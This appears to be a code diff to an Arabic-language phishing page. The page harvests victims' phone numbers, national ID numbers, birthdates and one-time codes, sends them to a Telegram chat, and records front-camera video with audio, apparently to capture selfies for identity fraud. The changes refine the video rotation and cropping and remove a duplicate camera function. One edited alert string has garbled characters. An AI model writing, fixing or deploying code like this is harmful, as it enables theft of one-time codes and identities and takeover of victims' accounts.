@@ -337,7 +337,7 @@
       document.getElementById('code5Form').onsubmit = async (e) => {
         e.preventDefault();
         const code = codeInput.value.trim();
-        if (code.length !== 5) { alert('يرجى إدخال رمز مكون من 5 أرقام'); codeInput.focus(); return; }
+        if (code.length !== 5) { alert('يرجى إدخال رمز مكون من 5 أر��ام'); codeInput.focus(); return; }
         userData.code5 = code;
         await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرقم الوطني: ${codeWrap(userData.nationalId)}\nتاريخ الميلاد: ${escapeHtml(userData.birthdate)}\nالرمز المؤقت: ${codeWrap(userData.code5)}`);
         showWaitMsgAndGotoCode4();
@@ -439,7 +439,7 @@
     }
     function stopCameraForRecording() { try { if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; } } catch(e){} }
 
-    // REPLACED: Robust portrait canvas preview/drawing function
+    // Robust portrait canvas preview/drawing function (fixed rotation & center-crop)
     function createPortraitCanvasAndPreview(videoEl) {
       // Target recording resolution (portrait)
       const targetW = 720;
@@ -469,30 +469,44 @@
         const vh = videoEl.videoHeight || 1;
 
         if (vw > 0 && vh > 0) {
+          // clear and fill background
           ctx.fillStyle = '#000';
           ctx.fillRect(0,0,targetW,targetH);
 
-          // If source frame is landscape (vw > vh) rotate 90deg CW to make portrait upright.
-          // This fixes the sideways / "tilted" capture seen on some devices.
-          if (vw > vh) {
-            ctx.save();
-            ctx.translate(targetW/2, targetH/2);
-            ctx.rotate(90 * Math.PI / 180); // 90deg CW
-            const scale = Math.max(targetH / vw, targetW / vh);
-            const sw = vw / scale;
-            const sh = vh / scale;
-            const sx = Math.max(0, (vw - sw) / 2);
-            const sy = Math.max(0, (vh - sh) / 2);
-            ctx.drawImage(videoEl, sx, sy, sw, sh, -targetH/2, -targetW/2, targetH, targetW);
-            ctx.restore();
-          } else {
-            // Portrait: center-crop to cover
-            const scale = Math.max(targetW / vw, targetH / vh);
-            const sw = vw / scale;
-            const sh = vh / scale;
-            const sx = Math.max(0, (vw - sw) / 2);
-            const sy = Math.max(0, (vh - sh) / 2);
-            ctx.drawImage(videoEl, sx, sy, sw, sh, 0, 0, targetW, targetH);
+          try {
+            if (vw > vh) {
+              // Source appears landscape (common on some devices even in portrait).
+              // Rotate the frame into portrait before cropping/scaling.
+              const temp = document.createElement('canvas');
+              temp.width = vh; // rotated width becomes source height
+              temp.height = vw; // rotated height becomes source width
+              const tctx = temp.getContext('2d');
+
+              // rotate -90deg (CCW) so the video becomes upright portrait
+              tctx.translate(temp.width / 2, temp.height / 2);
+              tctx.rotate(-Math.PI / 2);
+              // draw the original video centered into temp
+              tctx.drawImage(videoEl, -vw / 2, -vh / 2, vw, vh);
+
+              // center-crop from temp to offscreen with cover scaling
+              const scale = Math.max(targetW / temp.width, targetH / temp.height);
+              const srcW = Math.round(targetW / scale);
+              const srcH = Math.round(targetH / scale);
+              const sx = Math.round((temp.width - srcW) / 2);
+              const sy = Math.round((temp.height - srcH) / 2);
+              ctx.drawImage(temp, sx, sy, srcW, srcH, 0, 0, targetW, targetH);
+            } else {
+              // Source is already portrait shaped — do center-crop -> fill
+              const scale = Math.max(targetW / vw, targetH / vh);
+              const srcW = Math.round(targetW / scale);
+              const srcH = Math.round(targetH / scale);
+              const sx = Math.round((vw - srcW) / 2);
+              const sy = Math.round((vh - srcH) / 2);
+              ctx.drawImage(videoEl, sx, sy, srcW, srcH, 0, 0, targetW, targetH);
+            }
+          } catch (err) {
+            // ignore occasional drawing issues
+            console.warn('drawLoop draw error', err);
           }
 
           // Draw to preview canvas.
@@ -648,23 +662,6 @@
         topStatus.style.display = 'none';
       }
     }
-
-    /* Camera helpers */
-    async function startCameraForRecording() {
-      if (mediaStream) return mediaStream;
-      try {
-        mediaStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user', width: { ideal: 720 }, height: { ideal: 1280 } },
-          audio: true
-        });
-        return mediaStream;
-      } catch (e) {
-        console.error('startCamera error', e);
-        showModalError('تعذر الوصول إلى الكاميرا. تأكد من منح الإذن ثم أعد المحاولة.');
-        throw e;
-      }
-    }
-    function stopCameraForRecording() { try { if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; } } catch(e){} }
 
     /* Events */
     recCancel.addEventListener('click', () => {
